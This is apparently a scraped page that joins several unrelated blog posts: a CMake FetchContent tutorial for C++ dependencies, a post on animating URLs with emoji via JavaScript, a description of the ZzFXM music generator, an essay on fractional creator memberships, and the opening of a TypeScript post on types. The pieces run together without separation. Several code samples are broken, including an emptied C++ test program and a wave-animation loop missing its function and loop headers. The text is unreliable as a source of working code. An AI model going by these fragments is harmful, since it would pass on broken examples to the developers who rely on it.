I found them an adequate solution for bigger projects. They’re also nice when you have dependencies that take very long to build (I’m looking at you OpenCV! <img title=":sleeping:" alt=":sleeping:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f634.png" height="20" width="20"><img title=":hourglass_flowing_sand:" alt=":hourglass_flowing_sand:" src="https://github.githubassets.com/images/icons/emoji/unicode/23f3.png" height="20" width="20">).<br>
But for your small side project that needs two or three libraries from Github, it’s often too much effort.</p>

<p>My main critique point is that the package manager itself becomes a dependency. Everyone that wants to build your project has install the correct version. If you’re using CI, you have to set up everything on the build server as well, which can be a pain sometimes.</p>

<h2 id="can-cmake-help-us-here">Can CMake help us here?</h2>
<p>Younger languages like Rust and Go incorporated package management in the build system.
This makes for a nicer developer experience as one does not have to choose which package manager to use. Also, packages are by default set up for the languages built-in package manager.</p>

<p>With this in mind, it’s natural to look towards CMake for a solution. I was excited to hear that CMake introduced a module called <a href="https://cmake.org/cmake/help/latest/module/ExternalProject.html"><code>ExternalProject</code></a> in version 3.0. <code>ExternalProject</code> wraps dependencies into a CMake target and allows managing foreign code from your <code>CMakeLists.txt</code>.</p>

<p>To use it, one must add a target via <code>ExternalProject_Add()</code>. CMake will then run the following steps for this target.</p>

<p><code>DOWNLOAD</code></p>

<p>Download the dependency. Here one can use a version control system or download from an URL.</p>

<p><code>UPDATE</code></p>

<p>Update the downloaded code if anything changed since the last CMake run.</p>

<p><code>CONFIGURE</code></p>

<p>Configure the project code.</p>

<p><code>BUILD</code></p>

<p>Build the dependencies code.</p>

<p><code>INSTALL</code></p>

<p>Install the built code into a specified directory.</p>

<p><code>TEST</code> (optional)</p>

<p>Run tests.</p>

<p>All the above commands are configurable. 
<code>ExternalProject</code> also allows for custom steps.
For more information, have a look at the <a href="https://cmake.org/cmake/help/latest/module/ExternalProject.html#module:ExternalProject">documentation</a>.</p>

<h3 id="so-is-this-the-solution">So, is this the solution?</h3>

<p>After playing around with it for a little bit, I found that <strong><code>ExternalProject</code> is not what I was looking for.</strong> <img title=":pensive:" alt=":pensive:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f614.png" height="20" width="20"></p>

<p>The reason is that when using <code>ExternalProject</code>, all its steps will run at build time.
This means that CMake downloads and builds your dependencies after the generation step.
So your dependencies will not be available yet when CMake configures your project.</p>

<h3 id="will-we-have-to-stick-to-submodules-then">Will we have to stick to submodules then?</h3>

<p>No, we won’t!</p>

<p>With version 3.11 CMake introduced a new module: <a href="https://cmake.org/cmake/help/latest/module/FetchContent.html"><code>FetchContent</code></a>.
The module offers the same functionality as <code>ExternalProject</code> but will build and install dependencies at configure time. 
That means we can use it to manage our C++ project dependencies from the <code>CMakeLists.txt</code> file! <img title=":tada:" alt=":tada:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f389.png" height="20" width="20"> <img title=":tada:" alt=":tada:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f389.png" height="20" width="20"> <img title=":tada:" alt=":tada:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f389.png" height="20" width="20"></p>

<h2 id="how-to-use-fetchcontent">How to use <code>FetchContent</code>
</h2>

<p>In this <a href="https://github.com/bewagner/fetchContent_example">repository</a>, I prepared an example. It uses <code>FetchContent</code> to include the libraries’ <a href="https://github.com/onqtam/doctest">doctest</a> and <a href="https://github.com/ericniebler/range-v3">range-v3</a>.
CMake will download and build the dependencies.
Very convenient!
I will explain how everything works below. Make sure you get the <a href="https://github.com/bewagner/fetchContent_example">code</a> to play around with it.</p>

<p>We begin by creating a regular CMake project.
The <code>FetchContent</code> API got a makeover that makes usage easier in version 3.14.
Thus this is the least version we need.
Then we include the <code>FetchContent</code> module.</p>

<figure><pre><code data-lang="cmake"><span>cmake_minimum_required</span><span>(</span>VERSION 3.14<span>)</span>
<span>project</span><span>(</span>fetchContent_example CXX<span>)</span>

<span>include</span><span>(</span>FetchContent<span>)</span></code></pre></figure>

<p>We register each dependency with a call to <code>FetchContent_Declare()</code>. 
When making this call, you can customize how your dependency is loaded.
<code>FetchContent</code> understands almost the same options as <code>ExternalProject</code>. 
But the options related to <code>CONFIGURE</code>, <code>BUILD</code>, <code>INSTALL</code>, and <code>TEST</code> are disabled.</p>

<p>We declare two targets, one for <code>doctest</code> and one for <code>range-v3</code>.
CMake downloads both libraries via their git repository.</p>

<p>The parameter <code>GIT_TAG</code> specifies the commit in the dependencies history we use. 
One can also use git branch names or tags here. 
Yet, new commits can change what the branch is pointing to. This might affect the reproducibility of your project.
So the CMake documentation discourages using branch names or tags.</p>

<figure><pre><code data-lang="cmake"><span>FetchContent_Declare</span><span>(</span>
        DocTest
        GIT_REPOSITORY <span>"https://github.com/onqtam/doctest"</span>
        GIT_TAG <span>"932a2ca50666138256dae56fbb16db3b1cae133a"</span>
<span>)</span>
<span>FetchContent_Declare</span><span>(</span>
        Range-v3
        GIT_REPOSITORY <span>"https://github.com/ericniebler/range-v3"</span>
        GIT_TAG <span>"4d6a463bca51bc316f9b565edd94e82388206093"</span></code></pre></figure>

<p>Next, we call <code>FetchContent_MakeAvailable()</code>. 
This call makes sure CMake downloads our dependencies and adds their directories.</p>

<figure><pre><code data-lang="cmake"><span>FetchContent_MakeAvailable</span><span>(</span>DocTest Range-v3<span>)</span></code></pre></figure>

<p>Finally, we can add an executable and link to the included packages. 
CMake has taken over all the heavy lifting!</p>

<figure><pre><code data-lang="cmake"><span>add_executable</span><span>(</span><span>${</span><span>PROJECT_NAME</span><span>}</span> src/main.cpp<span>)</span>
<span>target_link_libraries</span><span>(</span><span>${</span><span>PROJECT_NAME</span><span>}</span> doctest range-v3<span>)</span></code></pre></figure>

<p>Using git repositories is the most convenient way of including dependencies with <code>FetchContent</code>. 
But, if the code you depend on is not a git repository, you can customize <code>FetchContent</code> to work with other sources. 
Have a look at the <a href="https://cmake.org/cmake/help/latest/module/ExternalProject.html#module:ExternalProject">documentation of <code>ExternalProject</code></a>.
It explains all parameters.</p>

<p>The whole <code>CMakeLists.txt</code> file will look like this.</p>

<figure><pre><code data-lang="cmake"><span>cmake_minimum_required</span><span>(</span>VERSION 3.14<span>)</span>
<span>project</span><span>(</span>fetchContent_example CXX<span>)</span>

<span>include</span><span>(</span>FetchContent<span>)</span>

<span>FetchContent_Declare</span><span>(</span>
        DocTest
        GIT_REPOSITORY <span>"https://github.com/onqtam/doctest"</span>
        GIT_TAG <span>"932a2ca50666138256dae56fbb16db3b1cae133a"</span>
<span>)</span>
<span>FetchContent_Declare</span><span>(</span>
        Range-v3
        GIT_REPOSITORY <span>"https://github.com/ericniebler/range-v3"</span>
        GIT_TAG <span>"4d6a463bca51bc316f9b565edd94e82388206093"</span>
<span>)</span>

<span>FetchContent_MakeAvailable</span><span>(</span>DocTest Range-v3<span>)</span>

<span>add_executable</span><span>(</span><span>${</span><span>PROJECT_NAME</span><span>}</span> src/main.cpp<span>)</span>
<span>target_link_libraries</span><span>(</span><span>${</span><span>PROJECT_NAME</span><span>}</span> doctest range-v3<span>)</span></code></pre></figure>

<p>After setting everything up in CMake, we can use the packages in our source code. 
Below is a small test program that makes use of both included libraries.</p>

<figure><pre><code data-lang="c++"><span>#define DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN
</span>

<span>}</span></code></pre></figure>

<h2 id="what-to-watch-out-for">What to watch out for</h2>
<p>Here are some things to keep in mind when using <code>FetchContent</code>.</p>

<h4 id="downloading-requires-an-internet-connection">Downloading requires an internet connection</h4>
<p>Of course, you have to be online for first downloading your dependencies. Compared to using submodules, this requirement is now hidden. So you might forget about it when building your code. 
To mitigate this problem, there is a set of options.</p>
<ul>
  <li>
<code>FETCHCONTENT_FULLY_DISCONNECTED=ON</code> will skip the <code>DOWNLOAD</code> and <code>UPDATE</code> steps</li>
  <li>
<code>FETCHCONTENT_UPDATES_DISCONNECTED=ON</code> will skip the <code>UPDATE</code> step</li>
</ul>

<h4 id="output-can-become-pretty-verbose">Output can become pretty verbose</h4>
<p><code>FetchContent</code> will log all its steps.
That’s why console output can become hard to read. 
To mute all output set <code>FETCHCONTENT_QUIET</code> to <code>ON</code>.</p>

<h4 id="the-library-has-to-be-installable">The library has to be installable</h4>
<p>A problem that I ran into quite often is that the dependency I wanted to use was not installable. Every once in a while you will come across libraries that are missing the call to <code>install()</code> in their <code>CMakeLists.txt</code>. In this case, <code>FetchContent</code> does not know how to copy the built code into the install folder and will fail. In this case, consider adding the <code>install()</code> calls and creating a PR.</p>

<p><code>FetchContent</code> works best with CMake based dependencies. I haven’t had a chance to test it with libraries that are not built with CMake. But I would expect that some extra configuration is necessary to make it work.</p>

<h2 id="conclusion">Conclusion</h2>

<p>In this blog post, we learned about <code>FetchContent</code>.
Now you know how to manage your dependencies from within your CMake setup. 
We saw how to use <code>FetchContent</code> to pull in dependencies for a small example project. 
And we read about some things to watch out for when using it.</p>

<p>I like this way of managing dependencies very much.
But of course, you can always mix different approaches and use what’s best for you!</p>

                <h4>by <a href="http://matthewrayfield.com/">Matthew Rayfield</a> on January 17th 2019</h4>

                <p>
                    <iframe width="560" height="315" src="https://www.youtube.com/embed/4YZt4HEv48Y" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen=""></iframe>

                <p>
                    You can use emoji (and other graphical unicode characters) in URLs. And wow is it great. But no one seems to do it.
                    Why? Perhaps emoji are too exotic for normie web platforms to handle? Or maybe they are avoided for fear of angering the SEO gods?
                </p>

                <p>
                    Whatever the reason, the overlapping portion on the Venn diagram of "It's Possible v.s. No One Is Doing It" is where my excitement usually lies.
                    So I decided to put a little time into the possibilities of graphical characters in URLs. Specifically, with the possibility for animating these characters by way of some Javascript.
                </p>

                <h2>Loopin'</h2>

                <p>
                    First off, make sure your page's Javascript code is being labelled as UTF-8 or you're gonna have a bad time putting emoji in your code at all. This can be accomplished via an HTTP header, or page META tag. There's a good chance you don't have to worry about this. But you can find more info about this here: <a href="https://flaviocopes.com/javascript-unicode/" target="_none">Unicode in Javascript by Flavio</a>
                </p>

                <p>
                    To achieve our desired outcome of emoji dancing like sugar plum fairies in our address bar, we need a loop.
                    And really, all we need is a loop. We start the loop, it loops, and we're happy. So here's our first loop, a spinning emoji moon.
                    I think when they added this sequence of emoji they must have had this in mind right?
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/moon.gif"></p>

                <pre>var f = ['🌑', '🌒', '🌓', '🌔', '🌝', '🌖', '🌗', '🌘'];

    function loop() {
        location.hash = f[Math.floor((Date.now()/100)%f.length)];

        setTimeout(loop, 50);
    }

    loop();</pre>
                <p><label for="moon-check">Run Moon Code:</label> </p>

                <p>
                    You can click the toggle checkbox above to see the result of this loop in your URL bar.
                </p>

                <p>
                    If you don't like the spinning moons you can swap out that array with whatever emojis you want. Like a clock:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/clock.gif"></p>

                <pre>var f = ['🕐','🕑','🕒','🕓','🕔','🕕','🕖','🕗','🕘','🕙','🕚','🕛'];</pre>
                <p><label for="clock-check">Run Clock Code:</label> </p>

                <p>
                    This is a real simple example. Too simple really. So let's upgrade our loop so that it generates a string of multiple emoji! This time we're utilizing the emoji "skin tone modifiers" characters to make some color-changing babies:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/babies2.gif"></p>

                <pre>var e = ['🏻', '🏼', '🏽', '🏾', '🏿'];

    function loop() {
        var s = '',
            i, m;

        for (i = 0; i &lt; 10; i ++) {
            m = Math.floor(e.length * ((Math.sin((Date.now()/100) + i)+1)/2));
            s += '👶' + e[m];
        }

        location.hash = s;

        setTimeout(loop, 50);
    }

    loop();</pre>
                <p><label for="babies-check">Run Babies Code:</label> </p>

                <p>
                    We use a sine wave controlled by time and position to select which color we want. This gives us a nice loopy color changing effect!
                </p>

                <p>
                    Or how about we revisit our moon spinner, spread it out, and make something resembling a loading indicator? Sure, let's do it:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/moons.gif"></p>

                <pre>var f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒'],
        d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        m = 0;

    function loop() {
        var s = '', x = 0;

        if (!m) {
            while (d[x] == 4) {
                x ++;
            }

            if (x &gt;= d.length) m = 1;
            else {
                d[x] ++;
            }
        }
        else {
            while (d[x] == 0) {
                x ++;
            }

            if (x &gt;= d.length) m = 0;
            else {
                d[x] ++;

                if (d[x] == 8) d[x] = 0;
            }
        }

        d.forEach(function (n) {
            s += f[n];
        });

        location.hash = s;

        setTimeout(loop, 50);
    }

    loop();</pre>
                <p><label for="multi-moon-check">Run Multi-Moon Code:</label> </p>

                <h2>Exploring Other Characters</h2>

                <p>
                    But it's not just emoji that give us a means to pump graphics out of our URL bar. There's a whole boatload of unicode characters of interest to our goals.
                </p>

                <p>
                    Particularly interesting are the <a href="https://en.wikipedia.org/wiki/Box-drawing_character" target="_none">Box-drawing Characters</a>:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/box-characters.png"></p>

                <p>
                    Many of these lend themselves better to a two dimensional output. But they're still pretty good on the single line we have to play with.
                    For instance we can make a string of multiple height varied block characters and construct a nice little wave:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/wavy.gif"></p>

        var i, n, s = '';

            n = Math.floor(Math.sin((Date.now()/200) + (i/2)) * 4) + 4;

            s += String.fromCharCode(0x2581 + n);
        }

        window.location.hash = s;

        setTimeout(loop, 50);

                    Using the variable width characters we can even wiggle on the horizontal, creating something like a progress bar:

                    A progress bar huh? That's like, almost useful. Which brings me to...
                </p>

                <h2>Displaying Video Progress In The URL Bar</h2>

                <p>
                    In an attempt to reduce the frivolity in our little experiment, I came up with the idea to show a web video's progress in the URL.
                    I simply attach a function that renders our progress string to the "timeupdate" event for a video, and voila! A video progress indicator in the URL, complete with the time and duration!
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/video-progress.gif"></p>

                <pre>var video;

    function formatTime(seconds) {
        var minutes = Math.floor(seconds/60),
            seconds = Math.floor(seconds - (minutes*60));

        return ('0'+minutes).substr(-2) + ':' + ('0'+seconds).substr(-2);
    }

    function renderProgressBar() {
        var s = '',
            l = 15,
            p = Math.floor(video.currentTime / video.duration * (l-1)),
            i;

        for (i = 0; i &lt; l; i ++) {
            if (i == p) s +='◯';
            else if (i &lt; p) s += '─';
            else s += '┄';
        }

        location.hash = '╭'+s+'╮'+formatTime(video.currentTime)+'╱'+formatTime(video.duration);
    }

    video = document.getElementById('video');
    video.addEventListener('timeupdate', renderProgressBar);</pre>
                <p><label for="video-progress-check">Run Video Progress Bar Code:</label> </p>

                <p>With the above checkbox checked, you can use the video below to try it out.</p>

                

                <p>
                    I rather like this lines and circle progress bar, but if you fancy some moon emoji, I've got you covered:

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/video-moons.gif"></p>

                <pre>var e = ['🌑', '🌘', '🌗', '🌖', '🌕'],
        video;

    function formatTime(seconds) {
        var minutes = Math.floor(seconds/60),
            seconds = Math.floor(seconds - (minutes*60));

        return ('0'+minutes).substr(-2) + ':' + ('0'+seconds).substr(-2);
    }

    function renderProgressBar() {
        var s = '',
            c = 0,
            l = 10,
            p = Math.floor(video.currentTime / video.duration * ((l*5)-1)),
            i;

        while (p &gt;= 5) {
            s += e[4];
            c ++;
            p -= 5;
        }
        s += e[p];
        c ++;

        while (c &lt; l) {
            s += e[0];
            c ++;
        }

        location.hash = s+formatTime(video.currentTime)+'╱'+formatTime(video.duration);
    }

    video = document.getElementById('video');
    video.addEventListener('timeupdate', renderProgressBar);</pre>

                    Okay, calling this progress bar "useful" is a stretch. But if I squint, I can almost see a scenario where it would be useful to have this in a video sharing URL. Like YouTube has the option of creating a link to a video at a specific time. Might it not be cool to include a visual indication? Hmmm?
                </p>

                <p>
                    Maybe there is some more useful implementation of this "technology" that I haven't come up with. I'll keep thinking on that. And hey, maybe you can come up with something?
                </p>

                <h2>One Last Thing</h2>

                <p>
                    You may be wondering why I used "location.hash =" instead of the newer and shinier HTML5 History API. Two reasons. One solvable. The other less so. Both inconvenient.
                </p>

                <p>
                    Issue 1 is also a feature of the History API: It actually changes the whole URL path, not just the hash. So if I use the History API and change our page to "/🌑🌘🌗🌖🌕", it'll look nicer than having tacked on a #. But it also means my web server must be able to response to "/🌑🌘🌗🌖🌕", or the user will be out of luck if they refresh, or otherwise navigate to the modified URL. This is doable, but trickier than using "location.hash =" which doesn't require me to prepare the …</p></div></div></div>

  <h2>What is it?</h2>
  <p>ZzFXM is a tiny JavaScript function that generates stereo music tracks from patterns of note and instrument data.
  Instrument samples are created using a modified<sup>[<a href="#note-code-1">1</a>]</sup> version of the super-tiny <a href="https://github.com/KilledByAPixel/ZzFX">ZzFX</a> sound generator by <a href="https://twitter.com/KilledByAPixel">Frank Force</a>.
   </p><figure><pre><code>//! ZzFXM (v2.0.1) | (C) Keith Clark | MIT | https://github.com/keithclark/ZzFXM
zzfxM=(f,n,o,t=125)=&gt;{let z,e,l,r,g,h,x,a,u,c,d,i,m,p,G,M,R=[],b=[],j=[],k=0,q=1,s={},v=zzfxR/t*60&gt;&gt;2;for(;q;k++)R=[q=a=d=m=0],o.map((t,d)=&gt;{for(x=n[t][k]||[0,0,0],q|=!!n[t][k],G=m+(n[t][0].length-2-!a)*v,e=2,r=m;e&lt;x.length+(d==o.length-1);a=++e){for(g=x[e],u=c!=(x[0]||0)|g|0,l=0;l&lt;v&amp;&amp;a;l++&gt;v-99&amp;&amp;u?i+=(i&lt;1)/99:0)h=(1-i)*R[p++]/2||0,b[r]=(b[r]||0)+h*M-h,j[r]=(j[r++]||0)+h*M+h;g&amp;&amp;(i=g%1,M=x[1]||0,(g|=0)&amp;&amp;(R=s[[c=x[p=0]||0,g]]=s[[c,g]]||(z=[...f[c]],z[2]*=2**((g-12)/12),zzfxG(...z))))}m=G});return[b,j]}</code></pre><figcaption>The ZzFXM song generator function — 418 bytes (gzip)</figcaption></figure>   <p>ZzfxM was developed to create music for size-limited productions (i.e. js13k Games). The song format is loosely based on the tracker MOD format, using sequences of repeating patterns to create long songs from small chunks of music data.
  Songs are <em>highly</em> compressible. Once gzipped they're tiny — typically, a few hundred bytes.</p>


  <h2>Playing a song</h2>
  <p>Audio samples are compiled by passing instrument, pattern and sequence data to <code>zzfxM()</code>. The function returns a pair of arrays containing sample data for the left and right stereo channels.
  To play the rendered song, call <code>zzfxP()</code> using the generated sample data. The <code>zzfxM</code> function returns a <a href="https://developer.mozilla.org/en-US/docs/Web/API/AudioBufferSourceNode">AudioBufferSourceNode</a>, which you can use to control the song (stop it, looping etc.).</p>

  <figure><pre><code>const songData = [
  [/* zzfx instruments */],
  [/* patterns */],
  [/* sequence */],
  /* speed (BPM) */
];

const buffer = zzfxM(...songData);    // Generate the sample data
const node = zzfxP(...buffer);        // Play the song
</code></pre><figcaption>Example code</figcaption></figure>
<ul>
    <li id="note-code-1">[1] The modifications allow ZzFX to create an array of audio data without immediately playing it.</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>In <a href="https://underjord.io/five-buck-fatigue.html">Five Buck Fatigue</a>, Lars Wikman writes about his frustrations with the increasing amount of content producers he is supporting through memberships:</p><blockquote>I want to support, I want to engage. But I also want to be mindful in how I spend my money. And $5/month adds up pretty quickly. There is a lot of consideration in committing that recurring payment for .. indefinite duration. And I think I'm getting sick of deciding.</blockquote><p>I'm 100% on board with this assessment. Subscriptions and memberships are great at aligning incentives between creators and patrons, but after supporting my fifth or sixth Patreon, each subsequent one feels like more work than the last. </p><h2 id="the-problem">The Problem</h2><!--kg-card-begin: markdown--><p>Right now, the fixed dollar amount + rewards design effectively makes every membership a <strong>custom membership</strong> that requires patrons spend extra time considering their support and dollar amount. <mark>Custom memberships simply do not scale in an age where millions of creators are making awesome things</mark>, because patrons want to support more creators than this allows for.</p>
<!--kg-card-end: markdown--><p>To break this problem down, lets look at three things each Patreon-like membership requires a patron to consider:</p><ol><li>The choice to support someone's work</li><li>The amount to support it for</li><li>The reward for supporting it</li></ol><!--kg-card-begin: markdown--><p>It's the bundling of these parts that leads to fatigue, because it quickly becomes both an analysis of value <em>and</em> a comparison task among all memberships the patron can remember they have. Unless a patron has a very high budget, <strong>this becomes patronage by a thousand paper cuts</strong>. Each membership forces patrons to answer questions like:</p>
<!--kg-card-end: markdown--><ul><li>What are these rewards exactly?</li><li>How do I value these rewards, is it really worth the $X/mo they're asking for?</li><li>Do I even care if I view/consume everything they produce, or do I just want to support them?</li><li>What other content am I supporting already? Is this creator's work better than that? </li><li>How much am I actually spending on creators? How much should I be spending?</li></ul><h4 id="rewards-are-not-actually-very-interesting">Rewards are not actually very interesting</h4><p>In a model where patrons decide among different monthly amounts to pay, rewards (primarily bonus content) exist as an enticement to get people to pay higher tiers. They're a sort of culture that has sprung up where every creator thinks they need to offer rewards because every other creator offers them. But I'd posit they're mostly unnecessary overhead, and if we change the model, far fewer creators will need to go through the rigamarole to offer them. Rewards are still useful, but not to the same degree they are present today.</p><h2 id="solution-fractional-memberships">Solution: Fractional Memberships</h2><p>What if we made a solution that simplified the patron's choice to just "<em>do I want to support this creator</em>", ignoring both the amount of support and rewards they may get?<strong> </strong></p><p>This could work<strong> </strong>by letting patrons <strong>set a fixed monthly budget for memberships (e.g. $40/mo), and the system would divide that equally among all the creators they want to support</strong>. This means that whenever a patron come across a creator they like, they can simply click 'support' and <em>that's it</em>.</p><p>I think this fractional membership design offers a solid foundation to build off of that would really expand the market. With some design considerations for optional rewards, it can cover the whole gamut of creators, from celebrities with millions of patrons down to the currently underserved long tail creators that may not even &nbsp;have a membership set up.</p><h3 id="rewards-and-thresholds">Rewards and Thresholds</h3><p>Even with a fixed monthly budget design, rewards could still be supported by letting creators add a <strong>reward threshold</strong> that if a patron's amount goes below, they lose access. E.g. Creator Bob wants to give rewards to anyone paying over $2/mo. Patron Alice has $10/mo budgeted for creators, and has just decided to support a sixth creator, bringing Bob's portion down to $1.67. At this point, Alice could be notified that she won't get Bob's reward anymore unless she takes an action.</p><p>There's four possible options that Alice could be offered: </p><ol><li>Up her budget to $12/mo, giving all creators $2/mo</li><li>Lock Bob in at $2/mo, upping her budget to $10.33/mo</li><li>Lock Bob in at $2/mo, reducing everyone else's fraction to keep $10/mo rate</li><li>Stop supporting one of her existing creators</li></ol><p>This could be simplified a bit further to <em>Keep reward from Bob? YES/NO</em> and if yes, then lock Bob in (option #3) and perhaps ask if she wants to up her monthly budget.</p><!--kg-card-begin: html--><p>The good part about this design is it shifts the decision complexity to only appear in situations where the patron's input is needed. The idea of a fixed monthly budget and a 'lock in' button are additionally both very easy concepts to understand. The downside is if many/most creators offered rewards, it could get to a point where every time a patron clicked 'support', they were punished with one of these choices, or a cascade of decisions would get triggered if several creators went below the reward threshold.</p><!--kg-card-end: html--><h4 id="solution-1-limit-who-can-offer-rewards">Solution #1: Limit Who Can Offer Rewards</h4><p>Reducing the patron's cognitive effort is a key part of the design, and a reward threshold notification is a high cognitive overhead task for patrons, so there must be some feedback loop to limit any creator from offering rewards. </p><p>Thus, to prevent reward-fatigue, this design should limit the above notification to creators who have already built audiences of a certain size. I think it's fair that if a creator can't get 1000 or more people to click the super low effort 'support' button, then they shouldn't be able to ask for extra cognitive effort on the part of patrons. </p><h4 id="solution-2-rewards-usage-model">Solution #2: Rewards Usage Model</h4><p>If the memberships platform was <em>also</em> a content management system for creators like how Patreon is, another solution to the above reward threshold notification issue is to track whether patrons are even consuming the creator's rewards. For instance, if Alice has never actually looked at Bob's reward content, then Alice shouldn't even be bothered with the above choice. If she later wants to view Bob's reward content, <em>then</em> she can be presented with a choice of locking Bob into the $2/mo amount to get the reward, or upping her budget. </p><h3 id="why-this-scales">Why This Scales </h3><p>This model is not too dissimilar to usage-based models in streaming services like Spotify, but with the explict control more in the hands of the patron. As such, I think it scales a lot better than the custom memberships world we have today for three reasons:</p><ul><li>The choice is a lot more straightforward</li><li>It lets the user set a budget that works for them and frees them of having recall what other memberships they have</li><li>It only presents tradeoffs when they're necessary to make</li></ul><h3 id="dynamics">Dynamics</h3><p>By de-emphasizing reward tiers and specific contribution amounts, and emphasizing and simplifying the 'support' action, this design is likely to alter which creators wind up getting support. It may also wind up increasing overall money going to creators by unlocking more potential patrons.</p><p>Long tail creators, many of whom may not even currently ask for money, are likely to come out better. With a much lower friction decision to support creators, patrons can send money to dozens of creators without a second thought, so its likely to increase this groups revenue. It also has some psychological benefits for long tail creators who do not make much. All things equal (e.g. getting $25 a month), it'd be more motivating to see 100 people supporting you fractionally ($0.25/ea) than 5 people ($5/ea). That tells you you're onto something, that it's not just a few of your friends throwing you money.</p><p>But the design does have the limitation of no rewards below a certain threshold, which may specifically undercut high priced, super niche plays. More consideration required here - perhaps long tail creators can add rewards but <em>only if</em> those rewards are above a certain amount (e.g. $20/mo). That might work for to capture <em>true fans</em> and niche expensive plays like business analysis.</p><p>Middle tail creators (&gt;1000 patrons) may or may not see much change, except they might feel less pressure to put up rewards. So someone like science video creator <a href="https://www.patreon.com/scottmanley">Scott Manley</a> whose youtube videos get hundreds of thousands of views may just decide not to offer a reward at all, relying on the breadth of his audience clicking the lower friction 'support' action without much thought, instead of the higher friction $4/mo reward tier he offers today.</p><p>Finally, celebrity creators (&gt;50k patrons) would probably want to invest in building out a slew of rewards, given they have an audience size large enough for extra effort to pay off.</p><h4 id="a-note-about-predictable-income">A Note About Predictable Income</h4><p>Currently on Patreon and other membership services, a creator can expect each patron of theirs to pay a predictable amount per month, which lets creators budget their lives. In the fractional membership model, if patrons over time support more and more creators, every month each creator gets a lower fraction of that patron's dollar amount (unless they upped their budget). But the easier it is to support people, the more likely creators are to get new supporters. There's a question whether this audience growth would offset the volatility introduced with per-patron revenue.</p><h4 id="support-and-creator-patron-relationship">Support and Creator-Patron Relationship</h4><p>There is a concern about a mismatch between how patrons feel and how creators feel when money exchanged gets very small. Patrons who click 'support' on a creator may feel they are doing them a favor, but if that patron has also supported 99 other people and has a budget of $10/mo, does their tiny 10 cent fraction <em>really </em>constitute supporting the creator, or is it a glorified like button? </p><p>To some extent, the model changes the nature of the relationship between patron and creator. Trading 10 or 100 true fans for 1000 or 10k 'support' fans may wind up losing some of the intimacy of creator-patron relationship in the current model. Something to contemplate.</p><h2 id="conclusion">Conclusion</h2><p>I'm by no means an expert in creator payments platforms, but in the things I've read I'm surprised I haven't seen any discussions of this type of fractional membership model as a way to help scale patronage and lower patron decision fatigue.

<p>Just what exactly <em>is</em> a type?</p>

<p>A common perspective is that types are <em>restrictions</em>. Static types restrict the set of values a variable may contain, capturing some subset of the space of “all possible values.” Under this worldview, a typechecker is sort of like an oracle, predicting which values will end up where when the program runs and making sure they satisfy the constraints the programmer wrote down in the type annotations. Of course, the typechecker can’t <em>really</em> predict the future, so when the typechecker gets it wrong—it can’t “figure out” what a value will be—static types can feel like self-inflicted shackles.</p>

<p>But that is not the <em>only</em> perspective. There is another way—a way that puts you, the programmer, back in the driver’s seat. You make the rules, you call the shots, you set the objectives. You need not be limited any longer by what the designers of your programming language decided the typechecker can and cannot prove. You do not serve the typechecker; the typechecker serves <em>you.</em></p>

<p>…no, I’m not trying to sell you a dubious self-help book for programmers who feel like they’ve lost control of their lives. If the above sounds too good to be true, well… I won’t pretend it’s all actually as easy as I make it sound. Nevertheless, it’s well within the reach of the working programmer, and most remarkably, all it takes is a change in perspective.</p>
<!-- more-->



<p>Let’s talk a little about TypeScript.</p>

<p>TypeScript is a <em>gradually-typed</em> language, which means it’s possible to mix statically- and dynamically-typed code. The original intended use case of gradual typing was to <em>gradually</em> add static types to an existing dynamically-typed codebase, which imposes some interesting design constraints. For one, a valid JavaScript program must also be a valid TypeScript program; for another, TypeScript must be accommodating of traditional JavaScript idioms.</p>

<p>Gradually typed languages like TypeScript are particularly good illustrations of the way type annotations can be viewed as constraints. A function with no explicit type declarations<sup><a href="#2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-1-definition" name="2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-1-return">1</a></sup> can accept <em>any</em> JavaScript value, so adding a type annotation fundamentally restricts the set of legal values.</p>

<p>Furthermore, languages like TypeScript tend to have subtyping. This makes it easy to classify certain types as “more restrictive” than others. For example, a type like <code>string | number</code> clearly includes more values than just <code>number</code>, so <code>number</code> is a more restrictive type—a <em>subtype</em>.</p>

<p>An exceptionally concrete way to illustrate this “types are restrictions” mentality is to write a function with an unnecessarily specific type. Here’s a TypeScript function that returns the first element in an array of numbers:</p>

<div>
 <div>
  <pre><span></span><span>function</span> <span>getFirst</span><span>(</span><span>arr</span>: <span>number</span><span>[])</span><span>:</span> <span>number</span> <span>|</span> <span>undefined</span> <span>{</span>
  <span>return</span> <span>arr</span><span>[</span><span>0</span><span>];</span>
<span>}</span>
</pre></div>

</div>

<p>This function would work perfectly well given a list of strings, but if you write <code>getFirst(["hello", "world"])</code>, the typechecker will complain. Of course, in this example the restriction is thoroughly self-imposed—it would be easy to give this function a generic type—but sometimes it’s not quite so easy. For example, suppose we write a function where the return type depends upon the type of the argument:</p>

<div>
 <div>
  <pre><span></span><span>function</span> <span>emptyLike</span><span>(</span><span>val</span>: <span>number</span> <span>|</span> <span>string</span><span>)</span><span>:</span> <span>number</span> <span>|</span> <span>string</span> <span>{</span>
  <span>if</span> <span>(</span><span>typeof</span> <span>val</span> <span>===</span> <span>"number"</span><span>)</span> <span>{</span>
    <span>return</span> <span>0</span><span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>return</span> <span>""</span><span>;</span>
  <span>}</span>
<span>}</span>
</pre></div>
